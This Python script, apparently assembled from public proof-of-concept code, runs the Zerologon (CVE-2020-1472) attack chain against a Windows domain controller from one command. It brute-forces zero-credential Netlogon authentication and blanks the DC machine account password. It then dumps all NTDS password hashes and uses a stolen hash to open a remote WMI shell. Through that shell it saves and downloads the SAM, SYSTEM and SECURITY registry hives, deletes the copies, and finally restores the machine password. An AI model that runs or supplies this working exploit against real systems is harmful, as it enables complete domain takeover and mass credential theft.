import sys
import logging
import argparse
import codecs
import hmac
import os
import cmd
import time
import ntpath
from binascii import unhexlify

import impacket
from impacket import version
from impacket import crypto
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from six import PY2

OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

##############
# https://github.com/VoidSec/CVE-2020-1472/blob/master/reinstall_original_pw.py
##############
class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName',nrpc.PLOGONSRV_HANDLE),
        ('AccountName',nrpc.WSTR),
        ('SecureChannelType',nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName',nrpc.WSTR),
        ('Authenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword',nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode',nrpc.NTSTATUS),
    )

##############
# WMIEXEC pulled from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
##############
class WMIEXEC:
    def __init__(self, commandlist=None, username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None):
        self.__commandlist = commandlist
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process,_ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
            if self.__commandlist:
                for entry in self.__commandlist:
                    self.shell.onecmd(entry)
            else:
                self.shell.cmdloop()
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()

class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""") 

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath) 
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()

        except Exception as e:
            logging.error(str(e))

            if os.path.exists(filename):
                os.remove(filename)



    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''

##############
# DumpSecrets pulled out of examples from https://github.com/SecureAuthCorp/impacket
##############
class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', targetip=None, sam='', system='', security='', justdc=True):
        self.__remoteName = remoteName
        self.__remoteHost = targetip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = system
        self.__securityHive = security
        self.__samHive = sam
        self.__ntdsFile = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = 'dump'
        self.__justDC = justdc
        self.__canProcessSAMLSA = True
        self.__useVSSMethod = False
        
    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, False)
                    self.__remoteOps.setExecMethod(None)
                    if self.__justDC is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))
            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName         = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName         = self.__samHive

                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    logging.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                   isRemote=self.__isRemote)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('LSA hashes extraction failed: %s' % str(e))
            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile
            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod,
                                           outputFileName=self.__outputFileName)
            try:
                self.__NTDSHashes.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                logging.error(e)
                if self.__useVSSMethod is False:
                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()



###########
# Simplify the chaining of tools
# Code pulled from 
# https://github.com/dirkjanm/CVE-2020-1472
# https://github.com/SecuraBV/CVE-2020-1472
# https://github.com/VoidSec/CVE-2020-1472
#
###########
class EasyMode(object):
    '''
    Simple class that mostly just validates the information sent to it and fires off the exploits in order
    '''
    def __init__(self, dchostname, domainname, ipaddress=None, port=None):
        self.hostname = dchostname
        self.domainname = domainname
        self.ipaddress = ipaddress
        self.port = port
        self.__MAX_ATTEMPTS = 2000

    @property
    def domainname(self):
        return self.__domainname
    
    @domainname.setter
    def domainname(self, domain):
        if domain and '$' in domain:
            domain = domain.rstrip('$')
        self.__domainname = domain

    @property
    def hostname(self):
        return self.__hostname
    
    @hostname.setter
    def hostname(self, host):
        self.__hostname = host

    @property
    def port(self):
        return self.__port

    @port.setter
    def port(self, port):
        if port:
            self.__port = port
        else:
            self.__port = 445

    @property
    def ipaddress(self):
        if self.__ipaddress:
            return self.__ipaddress
        else:
            return self.hostname

    @ipaddress.setter
    def ipaddress(self, ip):
        self.__ipaddress = ip
    
    @property
    def dc_handle(self):
        return '\\\\' + self.hostname
    
    def __try_zero_authenticate(self, originalpw=None):
        # Connect to the DC's Netlogon service.
        binding = epm.hept_map(self.ipaddress, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

        # Use an all-zero challenge and credential.
        plaintext = b'\x00' * 8
        ciphertext = b'\x00' * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
        flags = 0x212fffff

        # Send challenge and authentication request.
        serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, self.dc_handle + '\x00', self.hostname + '\x00', plaintext)
        serverChallenge = serverChallengeResp['ServerChallenge']
        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                rpc_con,
                self.dc_handle + '\x00', self.hostname + '$\x00',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                self.hostname + '\x00', ciphertext,
                flags
            )

            
            # It worked!
            assert server_auth['ErrorCode'] == 0
            if not originalpw:
                return rpc_con
            else:
                print()
                server_auth.dump()
                print("server challenge", serverChallenge)
                sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
                print("session key", sessionKey)

                try:
                    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
                    authenticator['Credential'] = ciphertext #authenticatorCred
                    authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var

                    nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
                    nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
                    
                    request = NetrServerPasswordSet()
                    request['PrimaryName'] = NULL
                    request['AccountName'] = self.hostname + '$\x00'
                    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
                    request['ComputerName'] = self.hostname + '\x00'
                    request["Authenticator"] = authenticator
                    pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(originalpw), sessionKey)
                    request["UasNewPassword"] = pwdata
                    resp = rpc_con.request(request)
                    resp.dump()

                except Exception as e:
                    print(e)
                return rpc_con

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
        except BaseException as ex:
            fail(f'Unexpected error: {ex}.')

    def __setaccountemptystring(self, rpc_con):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = self.dc_handle + '\x00'
        request['AccountName'] = self.hostname + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = self.hostname + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return rpc_con.request(request)

    def testexploit(self):
        self.performexploit(True)

    def performexploit(self, test=False):
        print('Performing authentication attempts...')
        rpc_con = None
        for attempt in range(0, self.__MAX_ATTEMPTS):
            rpc_con = self.__try_zero_authenticate()
            if rpc_con == None:
                print('=', end='', flush=True)
            else:
                break


        if rpc_con and not test:
            print('\nTarget vulnerable, changing account password to empty string')
            result = self.__setaccountemptystring(rpc_con)
            print('\nResult: ', end='')
            print(result['ErrorCode'])
            if result['ErrorCode'] == 0:
                print('\nExploit complete!')
            else:
                fail('Non-zero return code, something went wrong?')
        elif rpc_con and test:
            print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
        else:
            print('\nAttack failed. Target is probably patched.')
            sys.exit(1)

    def dumpsecrets(self):
        dumper = DumpSecrets(self.hostname, self.hostname + "$", domain=self.domainname, targetip=self.ipaddress)
        dumper.dump()

    def msiexec(self):
        if not os.path.exists('dump.ntds'):
            raise Exception("Soemthing went wrong we did not end up with an ntds file")
        userstring = None
        tempuserlist = list()
        with open('dump.ntds', 'r') as infil:
            for line in infil:
                tempuserlist.append(line)
        while not userstring:
            i = 0
            for line in tempuserlist:
                print("{0} - {1}".format(str(i), str(line)))
                i += 1
            answer = input("Which user number would you like to use for WMI? Q to quit")
            answer = answer.lower().strip() if answer else ""
            if answer and answer.isnumeric():
                userstring = line
            elif answer and answer.lower() == 'q':
                print('exiting as no user was selected good luck might have to go manual mode')
                sys.exit(0)
        userhash = tempuserlist[int(answer)].split(':')[2] + ":" + tempuserlist[int(answer)].split(':')[3]
        username = tempuserlist[int(answer)].split(':')[0]
        print(userhash)
        commandlist = ['reg save HKLM\\SYSTEM system.save', 'reg save HKLM\\SAM sam.save', 'reg save HKLM\\SECURITY security.save',
                       'get system.save', 'get sam.save', 'get security.save',
                       'del /f system.save', 'del /f sam.save', 'del /f security.save']
        wmiexecobject = WMIEXEC(commandlist=commandlist, share='ADMIN$', username=username, domain=self.domainname, hashes=userhash)
        wmiexecobject.run(self.ipaddress)

    def getpasswordbytes(self):
        dumper = DumpSecrets('LOCAL', sam='sam.save', system='system.save', security='security.save', justdc=False)
        dumper.dump()
    
    def resetpassword(self):
        machinehex = None
        with open('dump.secrets') as infil:
            for line in infil:
                if line.startswith('$MACHINE.ACC:plain_password_hex:'):
                    machinehex = line.replace('\r', '').replace('\n','').split(':')[2]
                    break
        if not machinehex:
            print('error dumping the machine password you are screwed')
            sys.exit(0)
        # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
        print('Performing authentication attempts...')
        rpc_con = None
        for attempt in range(0, self.__MAX_ATTEMPTS):  
            rpc_con = self.__try_zero_authenticate(machinehex)
            
            if rpc_con == None:
                print('=', end='', flush=True)
            else:
                break

        if rpc_con:
            print('\nSuccess! DC machine account should be restored to it\'s original value. You might want to secretsdump again to check.')
        else:
            print('\nAttack failed. Target is probably patched.')
            sys.exit(1)
        

    def easymode(self):
        self.performexploit()
        self.dumpsecrets()
        self.msiexec()
        self.getpasswordbytes()
        self.resetpassword()


#command line entry
if __name__ == "__main__":
    logger.init()
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout)
    
    print(version.BANNER)
    parser = argparse.ArgumentParser()

    connectiongroup = parser.add_argument_group('connection')
    connectiongroup.add_argument('-n', '--netbiosname', action='store', dest='hostname', metavar='HOSTNAME', required=True,
                                 help='''The netbios name of the device you are targeting.  Usually something like WIN-1H2LKR if in a lab environment''')
    connectiongroup.add_argument('-d', '--domain-name', action='store', metavar='DOMAINNAME', dest='domainname', required=True,
                                 help='The domain name the DC controls')
    connectiongroup.add_argument('-i', '--ip-target', action='store', metavar="ip address", dest='ipaddress',
                                 help='IP Address of the target machine. '
                                      'If omitted it will use whatever was specified as netbiosname. This is useful when target is the '
                                      'NetBIOS name and you cannot resolve it')
    connectiongroup.add_argument('-p', '--port', choices=['135', '139', '445'], action='store', metavar='PORT', dest='port', default=445,
                                 help='The destination port to connect to SMB server')
    
    options = parser.parse_args()
    easyobject = EasyMode(options.hostname, options.domainname, options.ipaddress, options.port)
    easyobject.easymode()
   
    